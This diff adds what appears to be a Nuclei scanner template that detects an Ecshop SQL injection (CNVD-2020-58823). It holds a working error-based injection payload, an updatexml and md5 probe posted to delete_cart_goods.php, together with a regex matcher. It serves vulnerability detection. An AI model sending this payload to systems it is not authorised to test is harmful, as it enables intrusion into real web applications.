@@ -1,0 +1,29 @@
+id: ecshop-sqli-cnvd-2020-58823
+info:
+  name: Ecshop SQL Injection Vulnerability (CNVD-2020-58823)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cnvd-2020-58823,sql-injection
+  description: |
+    Ecshop SQL Injection vulnerability that allows attackers to execute arbitrary SQL queries.
+    Identified as CNVD-2020-58823.
+
+variables:
+  random_value: "{{rand_int(40000, 44800)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/delete_cart_goods.php"
+    body: "id=0||(updatexml(1,concat(0x7e,(select%20md5({{random_value}})),0x7e),1))"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "~[a-f0-9]{32}~"
